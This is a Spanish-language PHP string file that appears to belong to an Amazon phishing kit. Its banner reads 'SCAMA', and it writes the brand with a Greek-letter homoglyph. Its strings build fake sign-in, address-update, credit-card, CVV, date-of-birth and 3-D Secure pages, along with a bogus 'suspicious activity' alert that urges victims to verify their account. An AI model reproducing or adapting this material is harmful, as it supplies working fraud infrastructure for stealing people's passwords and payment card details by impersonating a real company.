<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
/*---------------------------------- INICIAR SESIÓN LANG -------------------------------------*/
$_LANG['TITLEPAGE'] = "Inicio de sesión de Amazon ";
$_LANG['NEW'] = "¿Nuevo en Amazon?";
$_LANG['SIGNUP'] = "Crea tu cuenta de Amazon";
$_LANG['TITLESIGNIN1'] = "Iniciar sesión";
$_LANG['TITLESIGNIN2'] = "Correo electrónico (teléfono para cuentas móviles)";
$_LANG['TITLEFAIL'] = "Ingrese su correo electrónico o número de teléfono móvil";
$_LANG['CONTINUE'] = "Continuar";
$_LANG['HELP'] = "¿Necesita ayuda?";
$_LANG['FORGOT'] = "¿Olvidó su contraseña?";
$_LANG['OTHER'] = "Otros problemas con el inicio de sesión";
$_LANG['CHANGE'] = "Cambiar";
$_LANG['TITLEPASSWORD'] = "Contraseña";
$_LANG['PASSWORD'] = "Ingrese su contraseña";
$_LANG['TITLEKEEP'] = "Mantenerme conectado.";
$_LANG['CHECKKEEP'] = "Casilla de verificación";
$_LANG['NOTICEKEEP'] = "Mantenerme conectado";
$_LANG['NOTICEKEEP1'] = "Al elegir \ & quot; Mantenerme conectado \ & quot; se reduce el número de veces que se le solicita que inicie sesión en este dispositivo.";
$_LANG['NOTICEKEEP2'] = "Para mantener su cuenta segura,";
$_LANG['NOTICEKEEP3'] = "use esta opción solo en sus dispositivos personales.";
$_LANG['DETAIL'] = "Detalles";
$_LANG['FOOT'] = "Condiciones de uso";
$_LANG['FOOT1'] = "Aviso de privacidad";
$_LANG['FOOT2'] = "Ayuda";
$_LANG['FOOT3'] = "© 1996-<script>document.write(new Date().getFullYear());</script>, Αmazon.com, Inc. o sus afiliados";
$_LANG['FOOT4'] = "Anuncios basados en intereses";
$_LANG['FOOT5'] = "Volver arriba";
$_LANG['FOOT6'] = "Conózcanos";
$_LANG['FOOT7'] = "Carreras";
$_LANG['FOOT8'] = "Blog";
$_LANG['FOOT9'] = "Acerca de Amazon";
$_LANG['FOOT10'] = "Relaciones con los inversores";
$_LANG['FOOT11'] = "Dispositivos de Amazon";
$_LANG['FOOT12'] = "Gana dinero con nosotros";
$_LANG['FOOT13'] = "Vender en Amazon";
$_LANG['FOOT14'] = "Vende tus servicios en Amazon";
$_LANG['FOOT15'] = "Vender en Amazon Business";
$_LANG['FOOT16'] = "Vende tus aplicaciones en Amazon";
$_LANG['FOOT17'] = "Conviértase en Afiliado";
$_LANG['FOOT18'] = "Anuncie sus productos";
$_LANG['FOOT19'] = "Autoedición con nosotros";
$_LANG['FOOT20'] = "Ver todo";
$_LANG['FOOT21'] = "Productos de pago de Amazon";
$_LANG['FOOT22'] = "Tarjetas de Visa Signature de Amazon Rewards";
$_LANG['FOOT23'] = "Tarjeta de Tienda de Amazon.com";
$_LANG['FOOT24'] = "Línea de crédito corporativo de Amazon.com";
$_LANG['FOOT25'] = "Comprar con puntos";
$_LANG['FOOT26'] = "Mercado de tarjetas de crédito";
$_LANG['FOOT27'] = "Recargar su saldo";
$_LANG['FOOT28'] = "conversor de moneda de Amazon";
$_LANG['FOOT29'] = "Permítanos ayudarlo";
$_LANG['FOOT30'] = "Su cuenta";
$_LANG['FOOT31'] = "Sus pedidos";
$_LANG['FOOT32'] = "Tarifas y políticas de envío";
$_LANG['FOOT33'] = "Amazon Prime";
$_LANG['FOOT34'] = "Devoluciones y Reemplazos";
$_LANG['FOOT35'] = "Administre su contenido y dispositivos";
/*---------------------------------- ALERTA DE INICIAR SESIÓN ------------ -------------------------*/
$_LANG['TITLEALERT'] = "Hubo un problema";
$_LANG['ALERT'] = "Proporcione su dirección de correo electrónico o número de teléfono móvil";
$_LANG['ALERT1'] = "Dirección de correo electrónico o número de teléfono móvil no válidos";
$_LANG['ALERT2'] = "Por favor ingrese su contraseña";
$_LANG['ALERT3'] = "Ingrese los caracteres tal como aparecen en el desafío.";
/*---------------------------------- ACTUALIZAR ALERTA ------------ -------------------------*/
$_LANG['UPALERT'] = "Introduzca una línea de dirección válida";
$_LANG['UPALERT1'] = "Por favor ingrese un nombre de ciudad válido";
$_LANG['UPALERT2'] = "Introduzca un nombre de Estado / Provincia / Región válido";
$_LANG['UPALERT3'] = "Por favor ingrese un código postal válido";
$_LANG['UPALERT4'] = "Introduzca un número de teléfono válido";
$_LANG['UPALERT5'] = "Ingrese una fecha de nacimiento válida";
$_LANG['UPALERT6'] = "Por favor ingrese un nombre válido";
$_LANG['UPALERT7'] = "Introduzca un número de tarjeta válido";
$_LANG['UPALERT8'] = "Introduzca un código de seguridad de tarjeta válido";
$_LANG['UPALERT9'] = "CVV / CVV2";
/*---------------------------------- CUENTA DE ACTUALIZACIÓN DEL ENCABEZADO ----------- --------------------------*/
$_LANG['TITLEHEAD'] = "Su Αmazon Wallet";
$_LANG['HEAD'] = "Probar Prime";
$_LANG['HEAD1'] = "Cuenta y Listas";
$_LANG['HEAD2'] = "Pedidos";
$_LANG['HEAD3'] = "Carro";
$_LANG['HEAD4'] = "Historial de navegación";
$_LANG['HEAD5'] = "Noticias de Amazon";
$_LANG['HEAD6'] = "Ofertas de hoy";
$_LANG['HEAD7'] = "Tarjetas de regalo";
$_LANG['HEAD8'] = "Soporte al cliente de discapacidad";
$_LANG['HEAD9'] = "Su cuenta";
$_LANG['HEAD10'] = "Su dirección";
$_LANG['HEAD11'] = "Editar dirección";
$_LANG['HEAD12'] = "Editar su dirección";
$_LANG['HEAD13'] = "Buscar";
$_LANG['HEAD14'] = "Carro del tesoro";
$_LANG['HEAD15'] = "Ayuda";
/*---------------------------------- CUENTA DE ACTUALIZACIÓN DEL ENCABEZADO ----------- --------------------------*/
$_LANG['TITLEHEADUP'] = "Agregar o confirmar una dirección";
$_LANG['HEADUP'] = "Ingrese su información personal";
$_LANG['HEADUP1'] = "(Paso 1 de 2)";
$_LANG['HEADUP2'] = "JavaScript requerido";
$_LANG['HEADUP3'] = "Habilite JavaScript para usar esta página";
/*---------------------------------- FORMA ACTUALIZAR CUENTA ----------- --------------------------*/
$_LANG['TITLEUP'] = "Actualizar su dirección";
$_LANG['FRMUP'] = "Nombre completo";
$_LANG['FRMUP1'] = "Dirección de calle";
$_LANG['FRMUP2'] = "Ciudad";
$_LANG['FRMUP3'] = "Estado / Provincia / Región";
$_LANG['FRMUP4'] = "Código postal";
$_LANG['FRMUP5'] = "Número de teléfono";
$_LANG['FRMUP6'] = "Agregar o confirmar una tarjeta de crédito / débito";
$_LANG['FRMUP7'] = "Nombre en la tarjeta";
$_LANG['FRMUP8'] = "Número de tarjeta";
$_LANG['FRMUP9'] = "Fecha de caducidad";
$_LANG['FRMUP10'] = "Código de seguridad de la tarjeta";
$_LANG['FRMUP11'] = "Se puede usar para ayudar a la entrega";
$_LANG['FRMUP12'] = "Αmazon acepta todas las principales tarjetas de crédito y débito.";
$_LANG['FRMUP13'] = "SecureCode / VBV";
$_LANG['FRMUP14'] = "3D seguro / verificado por Visa";
$_LANG['COUNTRY'] = "País";
$_LANG['DOB'] = "Fecha de nacimiento";
$_LANG['TITLEADDRESS1'] = "Dirección línea 1";
$_LANG['TITLEADDRESS2'] = "Dirección línea 2";
$_LANG['ADDRESS1'] = "Calle y número, casilla P.O., c / o.";
$_LANG['ADDRESS2'] = "Apartamento, suite, unidad, edificio, piso, etc.";
$_LANG['TERMS'] = "Términos de actualización de Αmazon";
$_LANG['TERMS1'] = "Al hacer clic en Guardar y continuar, acepta Αmazon.";
$_LANG['TERMS2'] = "aviso de privacidad y condiciones de uso.";
$_LANG['SAVE'] = "Guardar y continuar";
/*---------------------------------- VBV / MSC TARJETA DE CRÉDITO --------- ----------------------------*/
$_LANG['TITLEVBVMSC'] = "Seguridad de seguridad 3-D";
$_LANG['VBVMSCPROCESS'] = "La seguridad 3-D se ha procesado correctamente ...";
$_LANG['VBVMSCLOAD'] = "Procesamiento";
$_LANG['VBVMSCSAFE'] = "Seguridad agregada en línea";
$_LANG['VBVMSCAUTH1'] = "ayuda a proteger su tarjeta contra el uso no autorizado en línea, sin costo adicional.";
$_LANG['VBVMSCAUTH2'] = "Para usar en esto y en futuras búsquedas.";
$_LANG['VBVMSCAUTH3'] = "complete esta página Usted creará la suya propia";
$_LANG['VBVMSCNAME'] = "Nombre en la tarjeta:";
$_LANG['VBVMSCCOUNTRY'] = "País:";
$_LANG['VBVMSCTYPE'] = "Tipo de tarjeta:";
$_LANG['VBVMSCNUMBER'] = "Número de tarjeta:";
$_LANG['VBVMSCDATE'] = "Fecha y hora:";
$_LANG['VBVMSCDOB'] = "Fecha de nacimiento:";
$_LANG['PENCET'] = "Enviar";
$_LANG['CAN NOT'] = "No se puede acceder a";
$_LANG['AMAZONCONTACT'] = "Contacto";
$_LANG['AMAZONCS'] = "Servicio al cliente de Amazon";
$_LANG['AMAZONASS'] = "Asistente de Amazon";
/*---------------------------------- AVISO CUENTA ACTUALIZACIÓN ----------- --------------------------*/
$_LANG['NOTIUP'] = "Al hacer clic en Aceptar y continuar, he leído y acepto la de Amazon";
$_LANG['NOTIUP1'] = "Acuerdo del usuario";
$_LANG['NOTIUP2'] = "Política de actualización de comunicaciones electrónicas";
$_LANG['NOTIUP3'] = "Αgree & Continue";
/*---------------------------------- IDIOMA ------------- ------------------------*/
$_LANG['BAHASA1'] = "EN";
$_LANG['BAHASA2'] = "Inglés";
/*---------------------------------- MAKASIH ------------- ------------------------*/
$_LANG['MAKASIH'] = "Gracias";
$_LANG['MAKASIH1'] = "Ha confirmado con éxito la información de su cuenta.";
/*---------------------------------- AVISO MAKASIH ------------ -------------------------*/
$_LANG['NOTICEMAKASIH'] = "Gracias,
Ha confirmado con éxito la información de su cuenta. ";
$_LANG['NOTICEMAKASIH1'] = "Consulte su correo electrónico para obtener más instrucciones e información detallada sobre su actualización. Si no registró su dirección de correo electrónico, visite <a href='#/gp/message'> Centro de mensajes </ a> para revisar sus notificaciones de actualización. ";
$_LANG['NOTICEMAKASIH2'] = "Obtenga notificaciones de actualización en su dispositivo móvil con la <a href='#/typapp'> aplicación gratuita de Amazon </a>.";
$_LANG['NOTICEMAKASIH3'] = "Activar actualización de 1 clic";
$_LANG['NOTICEID'] = "Actualizar ID:";
$_LANG['NOTICEID1'] = "Revisar o editar su cuenta";
$_LANG['NOTICESHOP'] = "Continuar comprando";
/*---------------------------------- AKTIVASI ------------- ------------------------*/
$_LANG['AKTIF'] = "Confirmar y activar";
/* ---------------------------------- AVISO DE ACTIVIDAD ------------ ------------------------- */
$_LANG['LOGINALERT'] = "Actividad sospechosa de detectar Amazon";
$_LANG['LOGINALERT1'] = "Actividades sospechosas";
$_LANG['LOGINALERT2'] = "Parece que uno o más dispositivos no autorizados están conectados a su cuenta y agregan seguridad con el número de teléfono: +1 (8 **) *** 2740.";
$_LANG['LOGINALERT3'] = "Iniciar la verificación ahora";
?>